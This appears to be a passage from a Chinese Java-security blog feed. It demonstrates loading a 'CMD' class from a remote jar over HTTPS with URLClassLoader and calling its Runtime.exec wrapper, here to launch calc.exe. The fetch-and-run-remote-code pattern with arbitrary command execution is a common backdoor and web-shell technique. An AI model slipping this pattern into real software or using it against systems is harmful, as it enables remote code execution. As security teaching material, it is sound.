-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">CMD</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String s)</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">throws</span> IOException</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> Runtime.getRuntime().exec(s);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在CMD.java中存在以一个CMD方法，存在一个参数执行命令</p>
-<p>使用UrlClassLoader加载此jar包</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://anbai.io/tools/cmd.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cmdClass</span> <span class="operator">=</span> ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span>           <span class="variable">in</span>   <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译运行后成功弹出计算器</p>
-<img src="/2022/03/07/%E5%88%A9%E7%94%A8UrlClassLoader%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDjar%E5%8C%85/image-20220307201611048.png" class>
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>javasec</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
       </tags>
   </entry>
   <entry>
